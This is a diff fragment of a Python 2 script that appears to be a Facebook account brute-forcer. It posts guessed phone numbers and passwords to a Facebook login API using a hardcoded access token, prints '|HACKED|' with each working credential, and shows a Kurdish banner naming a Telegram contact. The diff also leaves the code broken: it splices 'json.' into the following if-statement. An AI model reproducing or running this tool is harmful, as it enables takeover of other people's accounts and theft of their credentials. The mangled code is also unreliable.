@@ -432,9 +432,7 @@ def action():
 
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
-                                    q = json.load(data)
-
-                                    if 'access_token' in q:
+                                    q = json.                                    if 'access_token' in q:
 
                                         print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
 
@@ -493,7 +491,6 @@ for s in idd.split():
             menu()
 else:
     os.system('clear')
-    print '
     bani = '  \n  BU ACTIVE KRDNI TOOLAKAT\n\n NAMA BNERA BU Telegram | @ibrahimkocher\n'
     print bani
     print '       \033[92mID To Amaya ===> ' + sp[0]
